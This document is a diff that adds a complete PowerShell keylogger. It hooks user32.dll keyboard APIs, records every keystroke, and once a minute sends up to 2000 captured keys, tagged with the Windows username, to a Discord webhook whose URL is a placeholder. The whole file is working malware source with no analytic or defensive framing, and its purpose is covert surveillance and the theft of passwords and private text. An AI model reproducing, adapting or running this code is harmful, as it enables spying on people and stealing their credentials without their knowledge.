@@ -1,0 +1,92 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+#replace webhookUrl:
+$webhookUrl = "https://discord.com/api/webhooks/123456789/qwertyuiop-asdfghjkl"
+function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+
+    $Body = @{
+      'username' = $env:username
+      'content' = $text
+    }
+
+    if (-not ([string]::IsNullOrEmpty($text))){
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json)
+    }
+
+    if (-not ([string]::IsNullOrEmpty($file))){
+        curl.exe -F "file1=@$file" $webhookUrl
+    }
+}
+
+function Start-InputCatcher {
+    # Signatures for API Calls
+    $signatures = @'
+        [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+        public static extern short GetAsyncKeyState(int virtualKeyCode);
+
+        [DllImport("user32.dll", CharSet=CharSet.Auto)]
+        public static extern int GetKeyboardState(byte[] keystate);
+
+        [DllImport("user32.dll", CharSet=CharSet.Auto)]
+        public static extern int MapVirtualKey(uint uCode, int uMapType);
+
+        [DllImport("user32.dll", CharSet=CharSet.Auto)]
+        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+
+    # Load signatures and make members available
+    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+
+    # Create an array to store captured keys
+    $capturedKeys = @()
+
+    try {
+        Write-Host 'Running...' -ForegroundColor Red
+
+        $lastMinute = -1  # Initialize lastMinute to a value that won't interfere with the check
+
+        while ($true) {
+            Start-Sleep -Milliseconds 40
+
+            for ($ascii = 9; $ascii -le 254; $ascii++) {
+                $state = $API::GetAsyncKeyState($ascii)
+
+                if ($state -eq -32767) {
+                    $null = [console]::CapsLock
+                    $virtualKey = $API::MapVirtualKey($ascii, 3)
+                    $kbstate = New-Object Byte[] 256
+                    $checkkbstate = $API::GetKeyboardState($kbstate)
+                    $mychar = New-Object -TypeName System.Text.StringBuilder
+                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+
+                    if ($success) {
+                        # Add key to the array
+                        $capturedKeys += $($mychar.ToString())
+                    }
+                }
+            }
+
+            # Display the first 2000 captured keys once per minute
+            $currentMinute = (Get-Date).Minute
+            if ($currentMinute -ne $lastMinute) {
+                $firstTwoThousandKeys = $capturedKeys[0..1999] -join ''
+                Write-Host "First 2000 Captured Keys: $firstTwoThousandKeys" -ForegroundColor Green
+                Upload-Discord -text $firstTwoThousandKeys
+                $capturedKeys = $capturedKeys[2000..($capturedKeys.Count - 1)]  # Remove the first 2000 keys
+                $lastMinute = $currentMinute
+            }
+        }
+    }
+    finally {
+        $capturedKeys
+    }
+}
+
+# Run the script and store the captured keys in the $capturedKeys variable
+Start-InputCatcher
